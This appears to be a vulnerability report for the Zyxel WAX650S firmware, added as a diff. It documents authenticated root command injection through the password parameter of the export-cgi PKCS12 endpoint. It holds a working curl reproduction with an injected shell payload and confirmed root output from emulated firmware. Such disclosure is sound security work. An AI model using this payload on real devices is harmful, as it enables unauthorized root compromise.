@@ -1,0 +1,46 @@
+FINDING 2 — OS Command Injection in export-cgi (Authenticated)
+WAX650S V7.10(ABRM.4)C0 | export-cgi PKCS12 export endpoint
+═══════════════════════════════════════════════════════════════════════
+
+VULNERABILITY: The PKCS12 certificate export function passes the
+'arg1' (password) CGI parameter unsanitized into a shell command:
+
+  system("/bin/zysh -p 200 -e \"configure terminal ca _export
+          category local name <ARG0> password <ARG1>\"")
+
+A double-quote in ARG1 closes the shell string and allows arbitrary
+OS command injection. Commands execute as root (lighttpd runs as root;
+/bin/zysh is independently setuid root).
+
+───────────────────────────────────────────────────────────────────────
+PREREQUISITE: admin-level session cookie + one cert exists in
+  /etc/zyxel/ftp/cert/<certname>  (populated when admin manages certs)
+
+───────────────────────────────────────────────────────────────────────
+REPRODUCTION:
+
+$ curl -sk \
+     -H 'Cookie: authtok=<admin_session_token>' \
+     'https://[device]/cgi-bin/export-cgi?category=pkcs12&arg0=<certname>&arg1=x%22%3Bid%3B%23'
+
+# Decoded injection:  arg1 = x"; id; #
+# Shell sees:  /bin/zysh ... password x"; id; #"
+# Result:      /bin/zysh runs (truncated), then 'id' runs separately
+
+───────────────────────────────────────────────────────────────────────
+LIVE OUTPUT (from emulated firmware, root confirmed):
+
+$ curl ... 'arg0=testclean&arg1=x"; id; echo COMMAND_INJECTION_CONFIRMED; #'
+
+HTTP Response body:
+uid=0 gid=0(root) groups=0(root)
+COMMAND_INJECTION_CONFIRMED
+Status: 500 Internal Server Error !
+
+── zysh received (proves shell parsed the injection): ──
+ZYSH_CMD: /bin/zysh -p 200 -e configure terminal ca _export category local name testclean password x
+
+Analysis:
+  - zysh received: 'name testclean password x'  (injection truncated at closing quote)
+  - shell then ran: 'id'  → uid=0 gid=0(root) groups=0(root) in HTTP body
+  - shell then ran: 'echo COMMAND_INJECTION_CONFIRMED'  → appears in HTTP body
